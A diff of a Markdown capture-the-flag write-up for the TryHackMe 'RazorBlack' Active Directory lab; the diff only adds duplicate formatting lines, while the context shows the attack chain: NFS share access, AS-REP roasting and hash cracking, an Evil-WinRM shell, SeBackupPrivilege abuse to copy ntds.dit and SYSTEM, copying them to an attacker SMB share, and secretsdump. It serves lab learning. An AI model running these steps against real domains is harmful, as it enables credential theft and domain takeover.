@@ -95,6 +95,7 @@ Host script results:
 |_  start_date: N/A
 ```
 {: .nolineno}
+{: .nolineno}
 ## SMB Enumeration ⤵️
 
 I check with no creds through `netexec` Tool and I got no access but I got the domain name like this ->
@@ -112,6 +113,7 @@ Export list for 10.10.69.53:
 /users (everyone)
 ```
 {: .nolineno}
+{: .nolineno}
 I got a share named as <span style="color:#61ffe5">users</span> with access permissions to everyone. So lets access that ->
 ```bash
 ┌──(kali🔥kali)-[~/Downloads/Tryhackme/RazorBlack]
@@ -128,6 +130,7 @@ mount.nfs: prog 100005, trying vers=3, prot=6
 mount.nfs: trying 10.10.69.53 prog 100005 vers 3 prot TCP port 2049
 ```
 {: .nolineno}
+{: .nolineno}
 I have to be root to access that so lets see what inside of it ->
 ```bash
 ┌──(root㉿kali)-[/home/…/Downloads/Tryhackme/RazorBlack/mnt]
@@ -138,6 +141,7 @@ drwxr-xr-x 3 kali       kali       4096 Feb 27 20:43 ..
 -rwx------ 1 4294967294 4294967294 9861 Feb 25  2021 employee_status.xlsx
 -rwx------ 1 4294967294 4294967294   80 Feb 26  2021 sbradley.txt
 ```
+{: .nolineno}
 {: .nolineno}
 I then copied it to my system and I got a flag from `sbrandley.txt` file and I got some users from `employee_status.xlsx` file ->
 ![Image](Pasted%20image%2020240227205522.png)
@@ -182,11 +186,13 @@ if __name__ == "__main__":
         print(lname)                   # joe
 ```
 {: .nolineno}
+{: .nolineno}
 I stored all those usernames in a file ->
 ```bash
 ┌──(kali🔥kali)-[~/Downloads/Tryhackme/RazorBlack]
 └─$ python3 namemash.py users.txt > usernames.txt
 ```
+{: .nolineno}
 {: .nolineno}
 I then performed **<span style="color:#61ffe5">kerbrute userenum</span>** with this usernames.txt files and I got some hits like this 🔽
 ![Image](Pasted%20image%2020240227210236.png)
@@ -202,6 +208,7 @@ $krb5asrep$23$twilliams@RAZ0RBLACK.THM:71ce9c8e792de43cac6adc8d22f3eaaf$0dbfd672
 [-] User sbradley does not have UF_DONT_REQUIRE_PREAUTH set
 ```
 {: .nolineno}
+{: .nolineno}
 Lets crack this hash with John The Ripper Tool ->
 ```bash
 ┌──(kali🔥kali)-[~/Downloads/Tryhackme/RazorBlack]
@@ -215,6 +222,7 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
+{: .nolineno}
 {: .nolineno}
 Lets see the privileges of this user 🔽
 ![Image](Pasted%20image%2020240227210939.png)
@@ -235,6 +243,7 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
+{: .nolineno}
 {: .nolineno}
 I now have the credentials of 2 user <span style="color:#00ff91">twilliams</span> and <span style="color:#00ff91">xyan1d3</span>.
 
@@ -264,6 +273,7 @@ _WINRM Session_
 *Evil-WinRM* PS C:\Users\xyan1d3> 
 ```
 {: .nolineno}
+{: .nolineno}
 Lets try to crack this password ->
 Here are 3 Steps to do so 😀
 <mark style="background: #ABF7F7A6;">Step 1</mark> ⏩
@@ -273,11 +283,13 @@ Collect the credentials in a variable like this 🔻
 *Evil-WinRM* PS C:\Users\xyan1d3> $pass="01000000d08c9ddf0115d1118c7a00c04fc297eb010000006bc3424112257a48aa7937963e14ed790000000002000000000003660000c000000010000000f098beb903e1a489eed98b779f3c70b80000000004800000a000000010000000e59705c44a560ce4c53e837d111bb39970000000feda9c94c6cd1687ffded5f438c59b080362e7e2fe0d9be8d2ab96ec7895303d167d5b38ce255ac6c01d7ac510ef662e48c53d3c89645053599c00d9e8a15598e8109d23a91a8663f886de1ba405806944f3f7e7df84091af0c73a4effac97ad05a3d6822cdeb06d4f415ba19587574f1400000051021e80fd5264d9730df52d2567cd7285726da2" | ConvertTo-SecureString
 ```
 {: .nolineno}
+{: .nolineno}
 <mark style="background: #ABF7F7A6;">Step 2</mark> ⏩
 Now create the PSCredential Object passing the variables.
 ```powershell
 *Evil-WinRM* PS C:\Users\xyan1d3> $cred = New-Object System.Management.Automation.PSCredential($user, $pass)
 ```
+{: .nolineno}
 {: .nolineno}
 <mark style="background: #ABF7F7A6;">Step 3</mark> ⏩
 Finally extract clear text information from the PSCredential Object.
@@ -290,6 +302,7 @@ Password       : LOL here it is -> THM{FLAG_FLAG_FLAG_FLAG}
 SecurePassword : System.Security.SecureString
 Domain         :
 ```
+{: .nolineno}
 {: .nolineno}
 Now I checked the privileges or permissions on this shell and I got this ->
 ```powershell
@@ -344,6 +357,7 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 *Evil-WinRM* PS C:\Users\xyan1d3\Documents>
 ```
 {: .nolineno}
+{: .nolineno}
 So I have <span style="color:#61ffe5">SeBackupPrivilege</span> Enable lets exploit that with this reference ->
 https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960
 
@@ -359,6 +373,7 @@ createX
 expose %cdrive% E:X
 end backupX
 ```
+{: .nolineno}
 {: .nolineno}
 Now I executed it with **<mark style="background: #FAA3A3A6;">diskshadow</mark>** command like this 🔽
 ```powershell
@@ -376,6 +391,7 @@ On computer:  HAVEN-DC,  2/27/2024 8:58:06 AM
 -> create
 [...]
 ```
+{: .nolineno}
 {: .nolineno}
 Now I have to copy the <span style="color:#00ff91">ntds.dit</span> file.
 ```powershell
@@ -402,6 +418,7 @@ Mode                LastWriteTime         Length Name
 *Evil-WinRM* PS E:\Windows\Temp>
 ```
 {: .nolineno}
+{: .nolineno}
 I will be using `robocopy` command like this 🔻
 ```powershell
 *Evil-WinRM* PS E:\Windows\Temp> robocopy /b E:\Windows\ntds . ntds.dit
@@ -425,6 +442,7 @@ I will be using `robocopy` command like this 🔻
 The media is write protected.
 ```
 {: .nolineno}
+{: .nolineno}
 It did not work so I tried with method 2 of reference link and downloaded `SeBackupPrivilegeCmdLets.dll` and `SeBackupPrivilegeUtils.dll` files from https://github.com/giuliano108/SeBackupPrivilege that will enable the copy function.
 ```powershell
 *Evil-WinRM* PS C:\Users\xyan1d3\Documents> Import-Module .\SeBackupPrivilegeCmdLets.dll
@@ -442,6 +460,7 @@ d-----        2/27/2024   9:09 AM                Temp
 
 *Evil-WinRM* PS C:\Users\xyan1d3\Documents>
 ```
+{: .nolineno}
 {: .nolineno}
 Now lets copy that file into C:/Temp directory ->
 ```powershell
@@ -464,11 +483,13 @@ Mode                LastWriteTime         Length Name
 *Evil-WinRM* PS C:\Users\xyan1d3\Documents>
 ```
 {: .nolineno}
+{: .nolineno}
 Lastly I need to download both files into the attacker machines through anyways , I will be using download feature from **<span style="color:#f04276">evil-winrm</span>** Tool or I could also use smbserver to copy these files to my attacker machine like this 🔽
 ```powershell
 *Evil-WinRM* PS C:\Temp> copy ntds.dit \\10.11.74.199\share\ntds.dit
 *Evil-WinRM* PS C:\Temp> copy system \\10.11.74.199\share\system
 ```
+{: .nolineno}
 {: .nolineno}
 Now lets time to use <span style="color:#61ffe5">secretsdump.py </span>tool to extract the hashes like this 🔽
 ![Image](Pasted%20image%2020240228205813.png)
@@ -530,6 +551,7 @@ C:.
 </Objs>
 *Evil-WinRM* PS C:\Users\Administrator> 
 ```
+{: .nolineno}
 {: .nolineno}
 Lets crack this Password with that similar fashion of **system.txt** file ⏩
 ![Image](Pasted%20image%2020240228213717.png)
